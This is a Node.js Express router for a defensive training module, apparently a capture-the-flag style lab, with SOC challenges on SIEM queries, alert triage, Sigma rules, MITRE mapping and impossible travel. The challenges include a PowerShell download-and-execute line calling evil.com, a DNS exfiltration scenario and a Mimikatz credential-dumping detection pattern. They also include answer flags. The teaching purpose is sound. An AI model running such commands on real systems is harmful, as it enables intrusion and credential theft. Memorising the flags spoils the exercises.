/**
 * SOC & Detection Engineering Module (HackPath Pillar 4)
 * Covers: SIEM queries, log analysis, detection rules, alert triage, telemetry
 * Difficulty: Beginner → Intermediate
 */

const express = require('express');
const router = express.Router();

router.get('/', (req, res) => {
  res.render('soc/index', {
    title: 'SOC & Detection Engineering',
    user: req.session?.user,
  });
});

// S1: SIEM Log Query (Beginner)
router.get('/siem-query', (req, res) => {
  res.json({
    vuln: 'S1: SIEM Query — Failed Login Spike',
    level: 'Beginner',
    description:
      'You are a SOC analyst. A brute-force attack triggered an alert. Query your SIEM for all failed logins from a single IP in the last hour.',
    sample_logs: [
      { timestamp: '2026-01-15 09:01:22', user: 'admin', ip: '10.0.1.50', action: 'login_failed' },
      { timestamp: '2026-01-15 09:01:23', user: 'admin', ip: '10.0.1.50', action: 'login_failed' },
      { timestamp: '2026-01-15 09:01:24', user: 'admin', ip: '10.0.1.50', action: 'login_failed' },
      { timestamp: '2026-01-15 09:01:25', user: 'admin', ip: '10.0.1.50', action: 'login_success' },
      {
        timestamp: '2026-01-15 09:05:10',
        user: 'alice',
        ip: '192.168.1.20',
        action: 'login_success',
      },
    ],
    challenge:
      'IP 10.0.1.50 had 3 failed logins then a success — a textbook brute-force. Write the Splunk/ELK query to detect this pattern.',
    hint: 'index=auth action=login_failed | stats count by ip | where count > 5',
    flag: 'FLAG{soc_siem_brute_force_s1a0}',
  });
});

// S2: Alert Triage (Beginner)
router.get('/alert-triage', (req, res) => {
  res.json({
    vuln: 'S2: Alert Triage — True Positive vs False Positive',
    level: 'Beginner',
    description:
      'Your SIEM fired an alert: "Possible data exfiltration via DNS tunneling". Triage the alert and determine if it is a true or false positive.',
    alert_details: {
      source_ip: '10.0.1.99',
      dest_domain: 'data.evil-c2.com',
      query_length: 2400,
      frequency: '1 query every 3 seconds',
      encoded_data: 'base64 encoded payloads in DNS TXT records',
    },
    challenge: 'Is this a true positive? What indicators confirm DNS tunneling?',
    hint: 'Long DNS queries + high frequency + base64 in subdomains = DNS tunneling (true positive). Block and investigate the host.',
    flag: 'FLAG{soc_triage_dns_exfil_s2b1}',
  });
});

// S3: Detection Rule Writing (Intermediate)
router.get('/detection-rule', (req, res) => {
  res.json({
    vuln: 'S3: Write a Sigma Detection Rule',
    level: 'Intermediate',
    description:
      'Write a Sigma rule to detect mimikatz usage on a Windows endpoint. Sigma is the universal signature language for SIEM.',
    expected_rule:
      'title: Mimikatz Credential Dumping\ndetection:\n  selection:\n    EventID: 4688\n    CommandLine|contains: "sekurlsa::logonpasswords"\n  condition: selection',
    challenge:
      'Mimikatz uses sekurlsa::logonpasswords to dump credentials from LSASS. Your detection must alert on this command line pattern.',
    hint: 'EventID 4688 (process creation) + CommandLine contains: sekurlsa',
    flag: 'FLAG{soc_sigma_mimikatz_s3c2}',
  });
});

// S4: MITRE ATT&CK Mapping (Intermediate)
router.get('/mitre-map', (req, res) => {
  res.json({
    vuln: 'S4: Map an Attack to MITRE ATT&CK',
    level: 'Intermediate',
    description:
      'An attacker used PowerShell to download and execute a payload from the internet. Map this to the correct MITRE ATT&CK techniques.',
    attack_chain: [
      'Attacker runs: powershell -exec bypass -c iex(New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")',
      'Payload creates a scheduled task for persistence',
      'Payload establishes C2 beacon every 5 minutes',
    ],
    challenge: 'Which MITRE techniques map to each step of this attack chain?',
    hint: 'T1059.001 (PowerShell), T1053.005 (Scheduled Task), T1071.001 (Web Protocols for C2). See attack.mitre.org.',
    flag: 'FLAG{soc_mitre_t1059_t1053_s4d3}',
  });
});

// S5: Anomaly Detection (Pro)
router.get('/anomaly', (req, res) => {
  res.json({
    vuln: 'S5: Behavioral Anomaly — Impossible Travel',
    level: 'Pro',
    description:
      'A user authenticated from Tokyo 5 minutes ago and now authenticates from New York. This is physically impossible — detect it.',
    logs: [
      {
        timestamp: '09:00:00',
        user: 'ceo',
        ip: '203.0.113.5',
        geo: 'Tokyo, JP',
        user_agent: 'Chrome/120',
      },
      {
        timestamp: '09:05:00',
        user: 'ceo',
        ip: '198.51.100.22',
        geo: 'New York, US',
        user_agent: 'curl/8.0',
      },
    ],
    indicators: [
      '5-minute gap between Tokyo and New York (impossible travel)',
      'User agent changed from browser to curl (automation)',
      'IP geolocation jump of 10,000+ km',
    ],
    challenge: 'How would you automate detection of impossible-travel anomalies in your SIEM?',
    hint: 'Compare geoip of consecutive auth events per user. Alert when distance / time > max physical speed (~900 km/h). Factor in VPN/known-trusted IPs.',
    flag: 'FLAG{soc_impossible_travel_ceo_s5e4}',
  });
});

module.exports = router;
